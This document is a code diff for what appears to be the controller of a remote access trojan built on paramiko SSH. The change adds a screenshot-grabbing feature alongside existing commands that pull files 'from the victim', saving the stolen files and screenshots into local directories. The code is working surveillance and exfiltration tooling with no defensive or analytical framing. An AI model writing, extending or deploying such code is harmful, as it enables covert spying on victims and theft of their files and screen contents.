@@ -1,6 +1,7 @@
 import argparse
 import socket
 import sys
+import os
 import threading
 
 import paramiko
@@ -100,10 +101,16 @@ def set_cp(chan, cp=866):
     print(chan.recv(128).decode('cp866'))
 
 
-def read_incoming_file(channel, filename, filesize):
+def read_incoming_file(channel, filename, filesize, screen=False):
     '''
     Reads the file through the channel and writes it to the current directory.
     '''
+    if screen:
+        os.makedirs('screens', exist_ok=True)
+        filename = os.path.join('screens', filename.decode())
+    else:
+        os.makedirs('files', exist_ok=True)
+        filename = os.path.join('files', filename.decode())
     with open(filename, 'wb') as file_to_write:
         chunksize = 4096
         while filesize > 0:
@@ -114,7 +121,7 @@ def read_incoming_file(channel, filename, filesize):
             filesize -= len(data)
 
 
-def get_files(chan):
+def get_files(chan, screen=False):
     '''
     Try to receive files from the victim.
     '''
@@ -132,7 +139,7 @@ def get_files(chan):
             filename = chan.recv(size)
             filesize = chan.recv(32)
             filesize = int(filesize, 2)
-            read_incoming_file(chan, filename, filesize)
+            read_incoming_file(chan, filename, filesize, screen)
             count += 1
             print(f"[{count}]: File({filename}) received")
     except Exception as e:
@@ -146,7 +153,8 @@ def take_control(chan, ssh_t):
     '''
     getting_file_errors = {
         b'2': 'invalid path', b'3': 'no such file',
-        b'1': 'some problems', b'4': 'invalid grab command (usage: grab path [file])'
+        b'1': 'some problems', b'4': 'invalid grab command (usage: grab path [file])',
+        b'5': 'problems with taking/removing a screenshot'
     }
     ip, port = ssh_t.getpeername()
     while True:
@@ -157,10 +165,10 @@ def take_control(chan, ssh_t):
             print(port)
             continue
         chan.sendall(command)
-        if 'grab' in command:
+        if 'grab' in command or command == 'screen':
             status = chan.recv(1)
             if status == b'0':
-                get_files(chan)
+                get_files(chan, True if command == 'screen' else False)
             else:
                 print(getting_file_errors[status])
         elif command == 'server stop':
